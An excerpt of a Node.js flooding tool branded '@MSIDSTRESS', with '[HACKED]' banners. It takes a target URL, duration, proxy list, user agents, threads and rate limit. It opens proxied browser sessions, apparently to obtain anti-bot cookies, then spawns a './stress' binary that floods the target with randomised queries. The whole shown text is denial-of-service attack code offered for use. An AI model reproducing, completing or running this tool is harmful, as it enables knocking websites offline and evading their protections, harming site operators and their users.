...
if (process.argv.length < 9) {
    console.log(colors.rainbow('[HACKED]'), colors.red('URL Duration Proxy Ua Threads Ratelimit [optional: Strings] // @MSIDSTRESS'));
    process.exit(0);
}

async function main() {
    console.log(colors.rainbow('[HACKED]'), colors.red('Owner: @MSIDSTRESS | BROWSER'));
    const urls = process.argv[2], duration = process.argv[3], proxy = process.argv[4], useragent = process.argv[5],
        ...
        addua = fs.readFileSync(useragent, 'utf-8').toString().split('\n'),
    ...
    async function addsession() {
        try {
            ...
            solving({
                ...
                console.log(colors.rainbow('[HACKED]'), 'User-Agent: ' + useragents);
                console.log(colors.rainbow('[HACKED]'), 'Cookie: ' + goodcookie);
    ...
    for (let start = 0; start < threads; start++) {
        console.log(colors.rainbow('[HACKED]'), 'HACK by @MSIDSTRESS // Create session: #' + start);
			addsession();
    }
}
...
function solving(message) {
    return new Promise((resolve, reject) => {
        console.log(colors.rainbow('[HACKED]'), 'HACK by @MSIDSTRESS // Proxy added: ' + message.proxoid);
...
function post(urls, proxoid, domain, useragents, duration, goodcookie, threads, ratelimit, randquery) {
    let promise = new Promise((res, rej) => {
        const ls = spawn('./stress', ["mode=GFT", "url=" + urls, "domain=" + domain, "limit=1", "time=" + duration, "good=" + proxoid, "threads=" + ratelimit, "cookie=" + goodcookie, "user_agent=" + useragents, "rand_query=" + randquery]);
